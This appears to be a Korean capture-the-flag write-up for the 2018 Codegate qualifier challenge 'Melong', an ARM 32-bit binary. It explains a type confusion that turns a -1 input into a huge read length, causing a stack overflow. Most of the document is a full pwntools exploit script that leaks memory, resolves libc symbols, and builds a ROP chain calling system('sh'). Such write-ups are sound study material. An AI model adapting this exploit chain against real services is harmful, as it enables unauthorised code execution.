# [2018_Codegate_Prequal] \[PWN] Melong

## Key words

* ARM 32bit
* ARM Return Oriented Programming
* No ASLR
* Dynamic ELF
* Stack based buffer overflow
* Type confusion

## Solution

### Checksec

```
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

### Stack based buffer overflow

```c
_DWORD *__fastcall write_diary(_DWORD *result, void *a2)
{
  void *buf; // [sp+0h] [bp-14h]
  unsigned __int8 nbytes; // [sp+Fh] [bp-5h]

  buf = a2;
  nbytes = *result;
  if ( nbytes )
  {
    read(0, a2, nbytes);
    result = (_DWORD *)printf("you wrote %s\n", buf);
  }
  return result;
}
```

위 함수에서 nbytes를 조작하면 버퍼오버플로우가 발생합니다. 

```c
size_t PT()
{
  size_t v0; // r3
  size_t size; // [sp+4h] [bp-10h]
  void *ptr; // [sp+8h] [bp-Ch]
  int i; // [sp+Ch] [bp-8h]

  puts("Let's start personal training");
  puts("How long do you want to take personal training?");
  _isoc99_scanf("%d", &size);
  ptr = malloc(size);
  if ( ptr == (void *)exc2 )
  {
    puts("Okay, start to exercise!");
    for ( i = 0; i < (signed int)size; ++i )
    {
      puts("you are getting healthy..");
      sleep(1u);
    }
    free(ptr);
    v0 = size;
  }
  else
  {
    puts("Check your bmi again!!");
    free(ptr);
    v0 = 0;
  }
  return v0;
}
```

PT 함수의 리턴 값이 nbytes 값이 됩니다. -1을 입력하면 타입 컨퓨전 버그가 발생하면서 nbytes를 `0xffffffff`로 만들 수 있습니다.

### ROP

ROP를 해야 합니다. `0x00011bbc : pop {r0, pc}` 가젯을 통해 pc를 컨트롤할 수 있지만 Leak 버그가 없어서 system 함수를 찾을 수가 없습니다.

puts 함수를 호출해서 got를 확인해보면 서버에 ASLR이 걸려있지 않음을 확인할 수 있었습니다. pwntools의 Dynamic ELF 기능을 사용하려 했지만 오류가 발생해서 사용할 수가 없었습니다. 따라서 하단의 Reference를 참고하여 직접 DynELF 기능을 구현하여 system 함수의 주소를 구했습니다 =_=..

```python
from pwn import *
import sys

def check_bmi(height, weight):
	global p
	p.recvuntil("Type the number:")
	p.sendline("1")
	p.recvuntil("Your height(meters) : ")
	p.sendline(str(height))
	p.recvuntil("Your weight(kilograms) : ")
	p.sendline(str(weight))
	p.recvuntil("Your bmi is : ")
	bmi = float(p.recvline()[:-1])
	return bmi

def exercise():
	global p
        p.recvuntil("Type the number:")
        p.sendline("2")
	p.recvuntil("1. Check your bmi")

def register(inp):
	global p
        p.recvuntil("Type the number:")
        p.sendline("3")
	p.recvuntil("personal training?")
	p.sendline(inp)

def diary(inp):
	global p
        p.recvuntil("Type the number:")
        p.sendline("4")
	p.send(inp)

def leak(addr, full_flag = 0):
	global p
	p = process(["chroot", ".", "./qemu-arm-static", "./melong"])

	check_bmi(1,1)
	register("-1")

	payload  = "a"*0x50
	payload += "b"*4                # r11
	payload += p32(pop_r0_pc)       # pc
	payload += p32(addr)
	payload += p32(puts_plt)

	diary(payload)
	p.recvuntil("Type the number:")
	p.sendline("6")
	p.recvuntil("See you again :)\n")

	leaked = p.recvline()[:-1]
	if (len(leaked) > 4) and (full_flag == 0):
		leaked = leaked[:4]
	p.close()

#	print "At 0x%x" % addr
#	print hexdump(leaked)
	return leaked

def leak_phdr(base_addr):
	offset = u32(leak(base_addr + 0x1c).ljust(4, "\x00"))
	return base_addr+offset

def leak_dyn(addr):
	p_type = 1
	i = 0
	while (p_type != 0) and (p_type != 2):
		p_type = u32(leak(addr + i).ljust(4, "\x00"))
		i += 32
	return u32(leak(addr+i-32+8).ljust(4,"\x00"))

def leak_dyn_table(addr, table):
	p_val = 0
        i = 0
        while p_val != table:
                p_val = u32(leak(addr + i).ljust(4, "\x00"))
                i += 8
	print hexdump(p_val)
        return u32(leak(addr+i-8+4).ljust(4,"\x00"))

def leak_symbol(symtab, strtab, symbol):
	i = 0
	sym_name = ""
	while sym_name != symbol:
		st_name = u32(leak(symtab + i)[:2].ljust(4, "\x00"))
		sym_name = leak(strtab + st_name, full_flag = 1)
		log.info("Found symbols : %s (0x%x)" % (sym_name, st_name))
		i += 16
	return u32(leak(symtab + i -16 + 4).ljust(4, "\x00"))

def leak_binsh(addr):
	i = 0
	while True:
		res = leak(addr + i, 1)
		print hexdump(res)
		if "/bin/sh" in res:
			return addr + i
		i += 8

puts_plt  = 0x000104A8
puts_got  = 0x0002301C
pop_r0_pc = 0x00011BBC

"""
# Leaking the libc base
puts = u32(leak(puts_got)[:4])
malloc = u32(leak(malloc_got)[:4])
log.info("puts   : 0x%x" % puts)
log.info("malloc : 0x%x" % malloc)
pause()
leaked = ""
addr = puts & 0xfffffffffffff000
while leaked != "\x7fELF":
	leaked = leak(addr)
	addr -= 0x1000
"""

libc_base = 0xf66e8000
log.info("libc base : 0x%x" % libc_base)
"""
phdr_addr = leak_phdr(libc_base)
log.info("phdr addr : 0x%x" % phdr_addr)

dyn_addr = libc_base + leak_dyn(phdr_addr)
log.info("dyn addr  : 0x%x" % dyn_addr)

symtab = leak_dyn_table(dyn_addr, 6)
strtab = leak_dyn_table(dyn_addr, 5)
log.info("symtab    : 0x%x" % symtab)
log.info("strtab    : 0x%x" % strtab)

system = libc_base + leak_symbol(symtab, strtab, 'exit')
"""
system = libc_base + 0x2c771
log.info("system    : 0x%x" % system)

bss = 0x00023070
gadget1 = [
	0x00010460, ord('s'),	# pop {r3, pc}
	0x000105e4, bss,	# pop {r4, pc}
	0x000105e0, 0xdeadbeef,	# strb r3, [r4] ; pop {r4, pc}
]
gadget2 = [
        0x00010460, ord('h'),   # pop {r3, pc}
        0x000105e4, bss + 1,    # pop {r4, pc}
        0x000105e0, 0xdeadbeef,        # strb r3, [r4] ; pop {r4, pc}
]

if len(sys.argv) == 1:
	p = process(["chroot", ".", "./qemu-arm-static", "./melong"])
else:
	p = process(["chroot", ".", "./qemu-arm-static", "-g", "1234",  "./melong"])

check_bmi(1,1)
register("-1")

payload  = "a"*0x50
payload += "b"*4
payload += ''.join(map(p32, gadget1))
payload += ''.join(map(p32, gadget2))
payload += p32(pop_r0_pc)       # pc
payload += p32(bss)
payload += p32(system)

diary(payload)
p.recvuntil("Type the number:")
p.sendline("6")
p.recvuntil("See you again :)\n")
p.interactive()
```

qemu 가상환경에서 exploit 했기 때문에 쉘이 실행되지는 않습니다.

## Reference

http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html